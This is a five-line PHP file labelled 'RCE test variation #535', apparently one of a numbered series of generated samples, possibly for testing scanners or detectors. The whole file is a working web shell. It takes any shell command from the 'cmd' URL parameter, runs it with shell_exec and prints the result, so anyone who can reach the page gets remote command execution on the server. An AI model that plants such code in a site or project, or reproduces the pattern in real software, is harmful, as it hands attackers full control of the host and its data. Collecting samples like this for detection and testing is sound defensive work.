<?php
// RCE test variation #535
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>